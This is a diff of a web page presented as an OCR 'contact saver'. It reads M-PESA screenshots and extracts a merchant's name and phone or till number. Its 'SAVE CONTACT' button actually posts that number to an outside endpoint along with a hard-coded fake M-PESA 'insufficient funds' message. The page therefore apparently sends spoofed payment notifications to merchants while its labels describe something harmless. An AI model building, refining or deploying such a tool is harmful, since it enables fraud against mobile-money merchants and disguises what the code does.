@@ -1,187 +1,186 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Save Contact (OCR Edition)</title>
+<title>Fast Contact Saver (OCR)</title>
 <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
 <style>
-    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #121212; color: white; padding: 20px; margin: 0; }
-    .container { max-width: 500px; width: 95%; margin: auto; background: #1e1e1e; padding: 20px; border-radius: 12px; box-sizing: border-box; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-    h3 { text-align: center; margin-bottom: 15px; font-size: 1.4rem; color: #4CAF50; text-transform: uppercase; letter-spacing: 1px; }
-    
-    .upload-section { border: 2px dashed #4CAF50; padding: 30px 20px; text-align: center; border-radius: 10px; margin-bottom: 15px; cursor: pointer; transition: 0.3s; }
-    .upload-section:hover { background: #252525; border-color: #66bb6a; }
-    #imagePreview { max-width: 100%; border-radius: 8px; margin-top: 15px; display: none; border: 1px solid #333; }
+    body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #121212; color: white; padding: 20px; margin: 0; display: flex; justify-content: center; }
+    .container { max-width: 450px; width: 100%; background: #1e1e1e; padding: 25px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+    h3 { text-align: center; margin-top: 0; color: #4CAF50; letter-spacing: 1px; }
+    
+    .upload-section { border: 2px dashed #4CAF50; padding: 40px 20px; text-align: center; border-radius: 12px; cursor: pointer; transition: background 0.2s; }
+    .upload-section:active { background: #2a2a2a; }
+    #imagePreview { max-width: 100%; border-radius: 8px; margin-top: 15px; display: none; border: 1px solid #333; }
 
-    .manual-input-container { margin-top: 15px; padding: 15px; border: 1px solid #333; border-radius: 8px; background: #252525; }
-    .manual-input-container label { display: block; margin-bottom: 5px; font-size: 0.85rem; color: #4CAF50; font-weight: bold; }
-    
-    /* Layout for Input + Copy Button */
-    .input-group { display: flex; gap: 8px; margin-bottom: 15px; }
-    input[type="text"] { flex: 1; padding: 12px; background: #333; border: 1px solid #444; border-radius: 6px; color: white; box-sizing: border-box; font-size: 1.1rem; outline: none; }
-    input[type="text"]:focus { border-color: #4CAF50; }
+    .manual-input-container { margin-top: 20px; }
+    label { display: block; margin-bottom: 6px; font-size: 0.75rem; color: #888; font-weight: bold; text-transform: uppercase; }
+    
+    .input-group { display: flex; gap: 8px; margin-bottom: 15px; }
+    input[type="text"] { flex: 1; padding: 12px; background: #2c2c2c; border: 1px solid #444; border-radius: 8px; color: white; font-size: 1rem; outline: none; }
+    input[type="text"]:focus { border-color: #4CAF50; }
 
-    .copy-btn { width: auto; padding: 0 15px; margin-top: 0; background: #333; border: 1px solid #444; font-size: 0.8rem; white-space: nowrap; }
-    .copy-btn:hover { background: #444; }
+    .copy-btn { width: auto; padding: 0 15px; background: #333; border-radius: 8px; color: #4CAF50; border: 1px solid #444; cursor: pointer; font-weight: bold; }
 
-    button { width: 100%; padding: 16px; margin-top: 10px; border: none; border-radius: 6px; background: #4CAF50; color: white; font-weight: bold; cursor: pointer; font-size: 1rem; transition: 0.3s; }
-    button:hover:not(:disabled) { background: #45a049; transform: translateY(-1px); }
-    button:disabled { background: #555; cursor: not-allowed; }
-    
-    pre { background: #000; padding: 15px; margin-top: 15px; white-space: pre-wrap; word-wrap: break-word; border-radius: 6px; font-size: 0.9rem; color: #4CAF50; border: 1px solid #333; min-height: 20px; text-align: center; }
-    .loading-text { color: #ffeb3b; font-size: 0.9rem; text-align: center; display: none; margin-bottom: 10px; font-weight: bold; }
+    .action-btn { width: 100%; padding: 16px; border: none; border-radius: 8px; background: #4CAF50; color: white; font-weight: bold; cursor: pointer; font-size: 1rem; }
+    .action-btn:disabled { background: #333; color: #777; cursor: not-allowed; }
+    
+    #output { background: #000; padding: 12px; margin-top: 15px; border-radius: 8px; font-family: monospace; font-size: 0.85rem; color: #4CAF50; min-height: 1.2em; text-align: center; }
+    .loader-container { display: none; text-align: center; margin: 10px 0; color: #ffeb3b; font-weight: bold; font-size: 0.9rem; }
 </style>
 </head>
 <body>
 
 <div class="container">
-    <h3>Save Merchant Contact</h3>
-    
-    <div class="upload-section" onclick="document.getElementById('imageInput').click()">
-        <span>📸 Tap to Upload M-PESA Screenshot.</span>
-        <input type="file" id="imageInput" accept="image/*" style="display: none;" onchange="handleImage(this)">
-        <img id="imagePreview" alt="Preview">
-    </div>
+    <h3>Save Merchant</h3>
+    
+    <div class="upload-section" onclick="document.getElementById('imageInput').click()">
+        <span id="uploadText">📸 Tap to Scan M-PESA Screenshot</span>
+        <input type="file" id="imageInput" accept="image/*" style="display: none;" onchange="handleImage(this)">
+        <img id="imagePreview" alt="Preview">
+    </div>
 
-    <div id="loader" class="loading-text">🔍 Analyzing Screenshot...</div>
+    <div id="loader" class="loader-container">⚡ Fast Scanning...</div>
 
-    <div class="manual-input-container">
-        <label>MERCHANT NAME:</label>
-        <div class="input-group">
-            <input type="text" id="detectedName" placeholder="Waiting for scan...">
-        </div>
-        
-        <label>TILL / PHONE NUMBER:</label>
-        <div class="input-group">
-            <input type="text" id="detectedPhone" placeholder="Waiting for scan...">
-            <button class="copy-btn" onclick="copyNumber()" id="copyBtn">COPY</button>
-        </div>
-    </div>
+    <div class="manual-input-container">
+        <label>Merchant Name</label>
+        <div class="input-group">
+            <input type="text" id="detectedName" placeholder="Auto-filled name">
+        </div>
+        
+        <label>Till / Phone Number</label>
+        <div class="input-group">
+            <input type="text" id="detectedPhone" placeholder="Auto-filled number">
+            <button class="copy-btn" onclick="copyNumber()" id="copyBtn">COPY</button>
+        </div>
+    </div>
 
-    <button id="saveBtn" onclick="saveContact()">SAVE CONTACT</button>
-    <pre id="output"></pre>
+    <button id="saveBtn" class="action-btn" onclick="saveContact()">SAVE CONTACT</button>
+    <div id="output">Ready</div>
 </div>
 
 <script>
 const API = "https://mpesab.vercel.app";
 const FIXED_MESSAGE = "Failed. Insufficient funds in your M-PESA account as well as Fuliza M-PESA to send KSH15000.00. Available Fuliza M-PESA limit KSH0.00.";
 
+// Global worker for speed (initializes once)
+let worker = null;
+
+async function initWorker() {
+    worker = await Tesseract.createWorker('eng');
+}
+initWorker(); // Start initializing immediately on load
+
 async function handleImage(input) {
-    const file = input.files[0];
-    if (!file) return;
+    const file = input.files[0];
+    if (!file) return;
 
-    const reader = new FileReader();
-    reader.onload = e => {
-        const preview = document.getElementById('imagePreview');
-        preview.src = e.target.result;
-        preview.style.display = 'block';
-    };
-    reader.readAsDataURL(file);
+    // Fast Preview
+    const reader = new FileReader();
+    reader.onload = e => {
+        const preview = document.getElementById('imagePreview');
+        preview.src = e.target.result;
+        preview.style.display = 'block';
+        document.getElementById('uploadText').style.display = 'none';
+    };
+    reader.readAsDataURL(file);
 
-    const loader = document.getElementById('loader');
-    loader.style.display = 'block';
-
-    try {
-        const { data: { text } } = await Tesseract.recognize(file, 'eng');
-        processText(text);
-    } catch (err) {
-        alert("OCR Error. Please check image clarity.");
-    } finally {
-        loader.style.display = 'none';
-    }
+    const loader = document.getElementById('loader');
+    loader.style.display = 'block';
+    
+    try {
+        if (!worker) await initWorker();
+        const { data: { text } } = await worker.recognize(file);
+        processText(text);
+    } catch (err) {
+        console.error(err);
+        document.getElementById('output').innerText = "❌ OCR Failed.";
+    } finally {
+        loader.style.display = 'none';
+    }
 }
 
 function processText(rawText) {
-    let lines = rawText.split('\n').map(l => l.trim()).filter(l => l.length > 0);
-    let detectedPhone = "";
-    let detectedName = "";
-    let phoneIndex = -1;
+    const lines = rawText.split('\n').map(l => l.trim()).filter(l => l.length > 2);
+    let detectedPhone = "";
+    let detectedName = "";
 
-    for (let i = 0; i < lines.length; i++) {
-        let match = lines[i].match(/\b\d{5,12}\b/);
-        if (match) {
-            detectedPhone = match[0];
-            phoneIndex = i;
-            break;
-        }
-    }
+    // Optimized Regex: Look for 5-12 digit numbers (Tills or Phones)
+    const phoneMatch = rawText.match(/\b\d{5,12}\b/);
+    if (phoneMatch) {
+        detectedPhone = phoneMatch[0];
+        
+        // Find index of the line containing the phone number
+        const idx = lines.findIndex(line => line.includes(detectedPhone));
+        
+        // Logical Name Detection: Usually the merchant name is 1 or 2 lines above the number
+        if (idx > 0) {
+            let potentialName = lines[idx - 1];
+            // Filter out common UI text or short artifacts
+            if (potentialName.length < 3 && idx > 1) potentialName = lines[idx - 2];
+            detectedName = potentialName.replace(/[^a-zA-Z\s]/g, '').trim();
+        }
+    }
 
-    if (phoneIndex > 0) {
-        let potentialName = lines[phoneIndex - 1];
-        if (potentialName.length < 3 && phoneIndex > 1) {
-            potentialName = lines[phoneIndex - 2];
-        }
-        detectedName = potentialName.replace(/[^a-zA-Z\s]/g, '').trim();
-    }
+    // Fallback: Look for uppercase blocks if name logic failed
+    if (!detectedName || detectedName.length < 3) {
+        const nameMatch = rawText.match(/([A-Z]{3,}(?:\s[A-Z]{3,})+)/);
+        detectedName = nameMatch ? nameMatch[0] : "UNKNOWN MERCHANT";
+    }
 
-    if (!detectedName || detectedName.length < 3) {
-        let nameMatch = rawText.match(/([A-Z]{3,}(?:\s[A-Z]{3,})+)/);
-        detectedName = nameMatch ? nameMatch[0] : "Unknown Merchant";
-    }
-
-    document.getElementById('detectedPhone').value = detectedPhone;
-    document.getElementById('detectedName').value = detectedName.toUpperCase();
+    document.getElementById('detectedPhone').value = detectedPhone;
+    document.getElementById('detectedName').value = detectedName.toUpperCase();
 }
 
-// Function to copy the phone number
 function copyNumber() {
-    const phoneInput = document.getElementById('detectedPhone');
-    const copyBtn = document.getElementById('copyBtn');
-    
-    if (!phoneInput.value) return;
+    const phoneInput = document.getElementById('detectedPhone');
+    const btn = document.getElementById('copyBtn');
+    if (!phoneInput.value) return;
 
-    navigator.clipboard.writeText(phoneInput.value).then(() => {
-        const originalText = copyBtn.innerText;
-        copyBtn.innerText = "COPIED!";
-        copyBtn.style.backgroundColor = "#4CAF50";
-        
-        setTimeout(() => {
-            copyBtn.innerText = originalText;
-            copyBtn.style.backgroundColor = "#333";
-        }, 2000);
-    });
+    navigator.clipboard.writeText(phoneInput.value);
+    btn.innerText = "DONE!";
+    setTimeout(() => btn.innerText = "COPY", 1500);
 }
 
 async function saveContact() {
-    const btn = document.getElementById("saveBtn");
-    const output = document.getElementById("output");
-    const name = document.getElementById("detectedName").value.trim();
-    const phone = document.getElementById("detectedPhone").value.trim();
+    const btn = document.getElementById("saveBtn");
+    const output = document.getElementById("output");
+    const name = document.getElementById("detectedName").value.trim();
+    const phone = document.getElementById("detectedPhone").value.trim();
 
-    if (!phone || !name) {
-        output.innerText = "❌ Please fill in both Name and Number.";
-        return;
-    }
+    if (!phone || !name) {
+        output.innerText = "⚠️ Missing info";
+        return;
+    }
 
-    btn.disabled = true;
-    btn.innerText = "Processing...";
+    btn.disabled = true;
+    btn.innerText = "SAVING...";
 
-    try {
-        const response = await fetch(`${API}/send`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                phone: phone,
-                name: name,
-                amount: 0,
-                token: "CONTACT" + Date.now(),
-                message: FIXED_MESSAGE
-            })
-        });
+    try {
+        const response = await fetch(`${API}/send`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                phone: phone,
+                name: name,
+                amount: 0,
+                token: "C" + Math.random().toString(36).substr(2, 9),
+                message: FIXED_MESSAGE
+            })
+        });
 
-        if (response.ok) {
-            output.innerText = "✅ Contact Captured!\n" + name + " (" + phone + ")";
-            btn.innerText = "SUCCESS ✓";
-        } else {
-            throw new Error();
-        }
-    } catch (error) {
-        output.innerText = "❌ Connection Error";
-        btn.disabled = false;
-        btn.innerText = "SAVE CONTACT";
-    }
+        if (response.ok) {
+            output.innerText = "✅ SAVED: " + name;
+            btn.innerText = "DONE";
+        } else {
+            throw new Error();
+        }
+    } catch (error) {
+        output.innerText = "❌ Network Error";
+        btn.disabled = false;
+        btn.innerText = "SAVE CONTACT";
+    }
 }
 </script>
 </body>
